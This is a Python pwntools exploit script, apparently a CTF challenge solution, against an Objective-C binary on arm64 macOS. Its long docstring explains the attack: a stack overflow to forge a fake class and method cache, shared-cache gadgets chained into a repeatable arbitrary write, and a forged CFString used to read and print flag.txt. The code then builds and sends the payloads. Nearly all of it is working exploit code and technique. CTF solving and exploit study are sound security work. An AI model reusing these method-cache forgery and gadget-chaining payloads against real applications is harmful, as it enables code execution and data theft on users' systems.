from pwn import p64, remote, flat, context

"""
This challenge is a sequel of Lucky Visitor from skateboarding dog CTF 2025:
https://github.com/skateboardingdog/bsides-cbr-2025-challenges/tree/main/pwn/lucky-visitor
The challenge is almost identical to the original, except for there being no
win function, and instead a weird category added to the NSData class. The bug
is the same as last year's challenge (buffer overflow to overwrite the iphone
variable on the stack), but with an address buffer of size 0x50 instead of 0x40.
We are given both a binary leak and the address of objc_msgSend, which gives us
a dyld shared cache slide leak.

The high level strategy we use here is to get an arbitrary write to construct a
fake CFString for @"flag.txt", then call the NSData(Stdin)'s stdinData method
but make stdinPath return the fake CFString instead of @"/dev/stdin", which
will read the flag.txt file. Chaining this with a CFShow call then prints it out.

Gadgets from the shared cache:

    double-call (Heimdal 0x1CB53E7E0):
        ADD  X29, SP, #0x30
        MOV  X20, X0
        LDR  X8, [X0,#0x10]
        BLR  X8
        MOV  X19, X0
        LDR  X8, [X20,#8]
        BLR  X8

    arb-write (MapKit 0x1916B2098):
        LDR X8, [X0,#0x30]
        LDR X9, [X0,#0x20]
        STR X8, [X9,#0x68]
        RET

    ldr-0x48 (libicucore 0x1801FDDE0):
        LDR X0, [X0,#0x48]
        RET

Before discussing how we get an arbitrary write, we explain the idea for
getting PC control using the overflow. It differs from last year's solution in
that it makes use of the method cache but not the preoptimized method cache.
We will point the target object to our address, A, which we control 0x50 bytes of.
In the normal path of execution, [A release] will get called due to ARC so we
try to forge something so that this call results in PC control. At A+0x0, we
put the value C=A+0x8 so that A's class is a fake class C which we now
construct. So far, the layout looks like this:

A +------------+
  |    A+0x8   |
C +------------+
  |     .      |
  | fake class |
  |     .      |
  +------------+

We now set up the fake class C such that the call [A release] will result in a
branch to a controlled value. At C+0x10 is the cache_t which is a QWORD
containing a flag in the LSB and a pointer in the low 48 bits and a mask in the
remaining upper bits. A flag of 1 indicates the preoptimized cache (like was
used in last year's solution), otherwise, the lower 48 bits is a pointer to the
buckets array and the mask is a mask used for clamping the index into that
array. In effect, it also indicates the size of the cache since size == mask + 1.
So in this QWORD, we will place some pointer which we then write our cache
bucket in. A cache bucket entry consists of 2 QWORDs, the first being the IMP
(more specifically, encoded IMP which is just the target location XORed by the
class ISA) and the second being the SEL (selector) corresponding to the entry.
When the cache is looked up, it hashes the selector and indexes relative to the
start of the buckets array to get to the bucket entry, then it checks that the
selector field matches the target selector, then decodes the implementation
pointer and branches to it. For example, we may set up the layout to now be:

A+0x00 +------------+
       |    A+0x8   |
A+0x08 +------------+
       |     .      |
A+0x10 |------------|
       |     .      |
A+0x18 +------------+
       |   A+0x38   |
A+0x20 +------------+
       |     .      |
A+0x28 +------------+
       |     .      |
A+0x30 +------------+
       |     .      |
A+0x38 +------------+
       |  imp ^ C   |
A+0x40 +------------+
       |     sel    |
A+0x48 +------------+

where sel is @selector(release) (just some pointer in the shared cache).

Okay, so for getting our write we use the arb-write gadget alongside the
double-call gadget so that we can return to main and do more stuff after the
write happens. The double-call gadget is very convenient because it calls
x0+0x10 followed by x0+0x8, where x0 is going to be our object (i.e. A).
Conveniently, we can place whatever we want in those locations (in the above
diagram they are empty / inconsequential).
So in A+0x8 we will place the address of main, and in A+0x10 we will place the
address of the arb-write gadget. The arb-write gadget will essentially do:
    *(*(A+0x20) + 0x68) = *(A+0x30)
That is, it will write the value located at A+0x30 into the value pointed at in
A+0x20, offset by 0x68 bytes. So we simply place our write target - 0x68 into
A+0x20, and then our write value into A+0x30.

A+0x00 +------------+
       |    A+0x8   |
A+0x08 +------------+
       |    main    |
A+0x10 |------------|
       | arb-write  |
A+0x18 +------------+
       |   A+0x38   |
A+0x20 +------------+
       | target-0x68|
A+0x28 +------------+
       |     .      |
A+0x30 +------------+
       |    value   |
A+0x38 +------------+
       |  imp ^ C   |
A+0x40 +------------+
       |     sel    |
A+0x48 +------------+

This achieves the repeatable arbitrary write, and we can use this to write a
fake CFString object anywhere in writable memory.

Now that we have the fake @"flag.txt" string somewhere, we are ready to trigger
the final stdinData -> CFShow chain. This is done by forging a class whose
method cache buckets send @selector(release) to the double-call gadget, and
@selector(stdinPath) to the ldr-0x48 gadget. The double-call gadget will be
used to call firstly the stdinData method implementation itself, which will
trigger calling the stdinPath on the fake object itself, which we've set the
cache implementation to the ldr-0x48 gadget, which simply loads the value at
X0+0x48 into X0 (we place the fake CFString at A+0x48). The stdinPath method
continues and completes reading the flag.txt file. The double-call gadget then
continues and calls CFShow, which will result in CFShow being called on the
result of stdinData that read the flag. The final layout looks like this:

A+0x00 +------------+
       |    A+0x8   |
A+0x08 +------------+
       |   cfshow   |
A+0x10 |------------|
       |  stdinData |
A+0x18 +------------+
       |  m|A+0x28  | (where m = 1 << 48, since we have two buckets)
A+0x20 +------------+
       |     .      |
A+0x28 +------------+
       |   dc ^ C   | (where dc is the double-call gadget addr)
A+0x30 +------------+
       |sel(release)|
A+0x38 +------------+
       |ldr0x48 ^ C |
A+0x40 +------------+
       |sel(stdinPath)|
A+0x48 +------------+
       |fake cfstr) |
       +------------+
"""

OFF_MAIN = 0x41FC
OFF_ADDR_BUF = 0xC090
OFF_STDIN_DATA = 0x401C
OFF_SEL_STDIN_PATH = 0x4647

# shared cache offsets
OFF_OBJC_MSGSEND = 0x197C10CE0
OFF_SEL_RELEASE = 0x19AC65C52
OFF_CFSHOW = 0x1804B23D8
OFF_DOUBLE_CALL = 0x1CB53E7E0
OFF_ARB_WRITE = 0x1916B2098
OFF_LDR_0X48 = 0x1801FDDE0
OFF_CFSTRING_CLASS = 0x1F5762FB8

conn = remote('localhost', 1337)

leak = conn.recvline().decode()
main_leak = int(leak.split('visitor number ')[1].split(' and')[0])
objc_msgSend_leak = int(leak.split('customer number ')[1].split('!')[0])
binary_base = main_leak - OFF_MAIN
dsc_slide = objc_msgSend_leak - OFF_OBJC_MSGSEND
print(f'{hex(binary_base) = }')
print(f'{hex(dsc_slide) = }')

addr_buf = binary_base + OFF_ADDR_BUF
main = binary_base + OFF_MAIN
stdin_data = binary_base + OFF_STDIN_DATA
sel_stdin_path = binary_base + OFF_SEL_STDIN_PATH
fake_class = addr_buf + 0x8

sel_release = dsc_slide + OFF_SEL_RELEASE
cfshow = dsc_slide + OFF_CFSHOW
double_call = dsc_slide + OFF_DOUBLE_CALL
arb_write = dsc_slide + OFF_ARB_WRITE
ldr_0x48 = dsc_slide + OFF_LDR_0X48
cfstring_class = dsc_slide + OFF_CFSTRING_CLASS

scratch_addr = addr_buf + 0x50
cfstr_addr = addr_buf + 0x60

def do_write(target, value):
    print(f'writing {hex(value)} into {hex(target)}')
    conn.sendafter(b'fruit? ', b'A' * 20 + p64(addr_buf) + b'\x00' * 4)
    payload = flat([
        p64(fake_class),
        p64(main),
        p64(arb_write),
        p64(addr_buf + 0x38),
        p64(target - 0x68),
        p64(0),
        p64(value),
        p64(double_call ^ fake_class),
        p64(sel_release)
    ])
    conn.sendafter(b'prize? ', payload)
    assert b'Thank you' in conn.recvline() # we jumped back to main

do_write(scratch_addr, int.from_bytes(b'flag.txt', 'little'))
do_write(cfstr_addr, cfstring_class)
do_write(cfstr_addr + 0x08, 0x07C8)
do_write(cfstr_addr + 0x10, scratch_addr)
do_write(cfstr_addr + 0x18, 8)

payload = flat([
    p64(fake_class),
    p64(cfshow),
    p64(stdin_data),
    p64((1 << 48) | (addr_buf + 0x28)),
    p64(0),
    p64(double_call ^ fake_class),
    p64(sel_release),
    p64(ldr_0x48 ^ fake_class),
    p64(sel_stdin_path),
    p64(cfstr_addr),
])

print('sending final payload')
conn.sendafter(b'fruit? ', b'A' * 20 + p64(addr_buf) + b'\x00' * 4)
conn.sendafter(b'prize? ', payload)

print(conn.recvline().decode())
flag_data = conn.recvline().decode()
flag = bytes.fromhex(flag_data.split('bytes = ')[1].split('}')[0][2:])
print(flag.decode())
